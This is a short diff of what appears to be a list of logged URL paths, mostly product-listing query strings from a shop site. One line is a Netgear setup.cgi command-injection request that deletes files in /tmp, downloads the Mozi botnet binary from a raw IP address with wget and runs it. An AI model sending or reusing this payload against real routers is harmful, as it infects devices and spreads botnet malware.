@@ -23861,3 +23861,4 @@ m.naver.com:443
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.63.48.112:52732/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /figs-loso-gold-figs-30-50-cm?order=ASC&page=2&sort=p.sort_order&tag=5
 /figs-loso-gold-figs-30-50-cm?order=DESC&sort=p.price&tag=30-50
+/figs-loso-gold-figs-30-50-cm?order=DESC&page=26&sort=pd.name&tag
